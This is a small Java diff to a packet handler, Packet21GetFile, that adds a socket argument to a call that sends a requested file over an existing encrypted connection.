@@ -18,7 +18,7 @@ public class Packet21GetFile extends AbstractIncomingPacket {
 			Connection.addToSendQueue(new Packet29SendFile(file.getName(), file.getAbsolutePath()));
 
 			FileIO fileio = new FileIO();
-			fileio.writeFile(file, Connection.dos, Connection.dis, null, Main.getKey());
+			fileio.writeFile(file, Connection.socket, Connection.dos, Connection.dis, null, Main.getKey());
 
 			Connection.lock();
 		}
